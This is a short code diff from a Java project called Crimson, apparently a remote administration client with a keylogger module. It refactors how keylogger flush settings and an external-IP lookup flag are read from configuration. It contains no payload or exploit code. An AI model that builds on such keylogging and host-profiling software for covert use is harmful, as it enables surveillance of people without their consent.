@@ -20,8 +20,8 @@ package com.subterranean_security.crimson.core.platform;
 
 import java.awt.GraphicsEnvironment;
 
-import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.modules.Keylogger;
+import com.subterranean_security.crimson.client.store.ConfigStore;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.platform.info.CPU;
 import com.subterranean_security.crimson.core.platform.info.CRIMSON;
@@ -81,7 +81,7 @@ public final class Platform {
 			if (!sa.valid(osFamily, Universal.instance)) {
 				continue;
 			}
-			if (sa == SimpleAttribute.NET_EXTERNALIP && !Client.ic.getAllowMiscConnections()) {
+			if (sa == SimpleAttribute.NET_EXTERNALIP && !ConfigStore.getConfig().getAllowMiscConnections()) {
 				continue;
 			}
 			String value = queryAttribute(sa);
@@ -128,9 +128,9 @@ public final class Platform {
 			}
 			return "" + s.ordinal();
 		case KEYLOGGER_TRIGGER:
-			return "" + Client.ic.getKeyloggerFlushMethod().ordinal();
+			return "" + ConfigStore.getConfig().getKeyloggerFlushMethod().ordinal();
 		case KEYLOGGER_TRIGGER_VALUE:
-			return "" + Client.ic.getKeyloggerFlushValue();
+			return "" + ConfigStore.getConfig().getKeyloggerFlushValue();
 		case IPLOC_CITY:
 			return IPLOC.getCity();
 		case IPLOC_COUNTRY:
